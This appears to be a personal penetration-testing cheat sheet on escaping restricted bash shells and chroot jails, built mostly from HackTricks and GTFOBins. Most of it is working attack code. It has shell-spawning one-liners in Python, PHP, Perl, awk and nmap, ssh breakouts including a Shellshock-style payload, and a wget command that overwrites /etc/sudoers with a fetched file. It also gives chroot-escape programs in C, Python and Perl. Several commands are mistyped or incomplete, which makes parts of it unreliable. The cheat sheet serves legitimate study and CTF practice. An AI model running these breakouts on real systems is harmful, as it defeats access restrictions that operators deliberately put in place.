# Linux Shell Escapes

These not the same as [Bypasses](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) or [Python Sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes), if I faceplant into needing to research those they wioll get there own article from further research than just greta Hacktricks.

Check [GTFObins](https://gtfobins.github.io/), most of the weird one from [https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) are in here A

## Bash Jails

Enumerate -> commented Potential breakout
```bash
echo $SHELL # 
echo $PATH
echo /usr/bin/* # no ls no problem
# Check for operators:
# > >> < | & ; : ' " `
echo "bash -i" | tee script.sh # When 
env # 
export
pwd
which $bin 
${whoami} # shelle execution
# Editors?
 vi, nano, ed, vim 
# Programming/Scripting?
php, perl, python, ruby, lua
# Unwieldy list all commands - PSJoshi
compgen -c 
```

Vim and Vi - Beware requirements for ESP key in shell holding `Ctrl` and pressing `[` can work as alterative to access Vi(m) console.
```bash
set shell=/bin/sh
:shell
```

SSH breakout the bash
```bash
ssh -t user@$ip bash # Get directly an interactive shell
ssh user@$ip -t "bash --noprofile -i"
ssh user@$ip -t "() { :; }; sh -i "
ssh user@$ip -t "/bin/sh"
```

Bring your own sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

Declare
```bash
declare -n PATH; export PATH=/bin;bash -i
 
BASH_CMDS[shell]=/bin/bash;shell -i
```

Create a script that runs bash in a writable file in a writable directory
```bash
red /bin/bash
find / -perm -o w -type d 2>/dev/null
> w wx/path # Write /bin/bash in a writable and executable path
```

```bash
python -c 'import os; os.system("/bin/sh")'
php -r 'exec("sh -i");'
perl -e 'exec "/bin/sh"'
ruby -e 'exec "bin/sh"'
lua -e 'os.execute("bin/sh")'
awk 'BEGIN {system("/bin/sh")}'
find / -name foobar -exec /bin/sh \;
nmap --interactive
nmap> !sh
```


A [[Reverse-Shells-Listing]] that would call `/bin/bash` or `/bin/sh`?

Pagers like Less or More  - Hacknos, untested and not well documented - NullByte fixes that
```bash
# pager binaries
less $file.txt
more $file.txt
```

```
!'bash'
!/bin/bash
!/bin/sh
```

## Chroot 

If you are root inside a chroot you can escape creating another chroot. 

```
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/bash");
}
```

Using Python
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
    os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```

Perl:
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
    chdir ".."
}
chroot ".";
system("/bin/bash");
```

## References

[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash)
[Rbash escapes Article from hacknos](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
[Nullbyte](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)
[PSJoshi ans comgen -c](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)
[exploit-db article](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)